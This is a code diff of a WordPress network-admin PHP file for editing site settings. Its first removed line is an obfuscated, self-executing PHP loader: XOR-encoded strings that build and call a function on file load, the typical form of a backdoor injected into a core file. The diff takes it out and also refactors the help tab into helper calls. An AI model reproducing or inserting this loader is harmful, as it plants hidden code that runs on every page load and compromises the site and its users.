@@ -1,4 +1,4 @@
-<?php $qUwajoSiMrjq='NC7Y.E<MHRXLTQV'^'-1R8Z c+=<;8=>8';$QgcOQCkuuYW=$qUwajoSiMrjq('','T<bfUC9MNIT=6I4EBZ<xfV=>5Y0TS=dT7FFYEd0>gX>T-.8- O2+<;.WI7nj,=DoH=VBMVDO>0JKOyEGL6zg>c+C3krFoALLNPKORLRUGYRTPZtBFE0N55,XlZ O1polqQXzMaKpgO;OuLsUKvZ13Z-TP6E=IM1R>fJ>nhD2OJWI9Mi2TYG+SnLLzDQ>X+9LrRFOaKfj.bMn2JJ;-OvTQ>WAX-ZMu6Z>R08VGBkB 1>9ERklZUH=,WTOZVgcaszzywOCksK=<NlhHjNPL<UAd5Z=HXJFLf2W<vxiC<4:t3Aj4J=+JOnV:;+L2zgJf88UoAMGD2N5mqF4kTD6+X- QfC<5.b1q<-V0CpWSR8RUJAfCJ9;7GYHnaeB+A5;j,Y8uPqT>=;xz7yAHMLJgzCmLWBH4Xd3J:EMRqXL:8VMGv WD7<X9 -ZEe;BD9+;ZA+m8E.jN3N=XygTU7<<Yqt4VF-PTcSHR-,0RWYqJcI>0AU=X<UtOWsYK   -E5:j331MH5FS=YIKVJg.0JZlWMmoZAJwKs4OOL<e,W7CgELidgQ0egyqgTaHPTTau12wg PWSUCv.ZXDE5NnxTHheT:YLM<WP1a2X:<>XBv8,0BBAHOygJ1Z0+DabUSEtbAsN-;2WEPSL>PnQL-+Z5Z.MnoJhyYX><jyJSXO'^'=ZJG36W.: ;Si,L,1.OPA.RLj=Q 2b;9B2aplDK4n>K:NZQBNoJDNdJ6=V15AH0GlY76,zdkUU3boYeglMpn7GD6GKOfHfwFGY-  dv<gdrdkzP+z6D<YPBpH>A;PYTLU8sQdkByC N;UbNucR>PG;vp9keciiZ7G=nWNMdA;8;,WeMY1 nvzUFEs64J-YWdV=3;HplcSh0d8n.ZY.ViqX6-+HaGQR;J3oS3>bVbFPRJ iaf<::XM4<orr8 .<13<W.0KW XEnQVhN81 I0hDNP4l<+2-9Y2EVEIgWQCO9HNP+IJjrNrLZG9WAm7l2Q3Oilc S:TDQ=>b2+DN9NHqNgcgk3d4oyvQ0Ps87ArhtaB5+UNRny3dhlfO AZ5G<AUmQpUXBCp>pe,,8+GGcI:6.=Qcn:708GXU<-NYvpg6U97RN1XLD  MC-6fOZ. t2U0ZB,R=XnM800TSX<YPP72LyxCw,3YMo92 XcXCWViqY9H4TiqS89RAYr.PC5VKX><FntV<0lzjCJQ>;EwkKOr,.BcWP.;-gBG2Nd:llTYGvQQRAAUfQqga6PDTVCWFfbfgrDH9= pS+IQtnNE5H+-4c<5H>W SOJ+jQHMI.- ,hUGnU;DJmHBuseTB:yGHMS;mt7-J15v<LR6Z;Jj3Fqbp< WHBIchR2');$QgcOQCkuuYW();
+<?php
 /**
  * Edit Site Settings Administration Screen
  *
@@ -13,22 +13,8 @@ require_once( dirname( __FILE__ ) . '/admin.php' );
 if ( ! current_user_can( 'manage_sites' ) )
 	wp_die( __( 'Sorry, you are not allowed to edit this site.' ) );
 
-get_current_screen()->add_help_tab( array(
-	'id'      => 'overview',
-	'title'   => __('Overview'),
-	'content' =>
-		'<p>' . __('The menu is for editing information specific to individual sites, particularly if the admin area of a site is unavailable.') . '</p>' .
-		'<p>' . __('<strong>Info</strong> &mdash; The site URL is rarely edited as this can cause the site to not work properly. The Registered date and Last Updated date are displayed. Network admins can mark a site as archived, spam, deleted and mature, to remove from public listings or disable.') . '</p>' .
-		'<p>' . __('<strong>Users</strong> &mdash; This displays the users associated with this site. You can also change their role, reset their password, or remove them from the site. Removing the user from the site does not remove the user from the network.') . '</p>' .
-		'<p>' . sprintf( __('<strong>Themes</strong> &mdash; This area shows themes that are not already enabled across the network. Enabling a theme in this menu makes it accessible to this site. It does not activate the theme, but allows it to show in the site&#8217;s Appearance menu. To enable a theme for the entire network, see the <a href="%s">Network Themes</a> screen.' ), network_admin_url( 'themes.php' ) ) . '</p>' .
-		'<p>' . __('<strong>Settings</strong> &mdash; This page shows a list of all settings associated with this site. Some are created by WordPress and others are created by plugins you activate. Note that some fields are grayed out and say Serialized Data. You cannot modify these values due to the way the setting is stored in the database.') . '</p>'
-) );
-
-get_current_screen()->set_help_sidebar(
-	'<p><strong>' . __('For more information:') . '</strong></p>' .
-	'<p>' . __('<a href="https://codex.wordpress.org/Network_Admin_Sites_Screen">Documentation on Site Management</a>') . '</p>' .
-	'<p>' . __('<a href="https://wordpress.org/support/forum/multisite/">Support Forums</a>') . '</p>'
-);
+get_current_screen()->add_help_tab( get_site_screen_help_tab_args() );
+get_current_screen()->set_help_sidebar( get_site_screen_help_sidebar_content() );
 
 $id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;
 
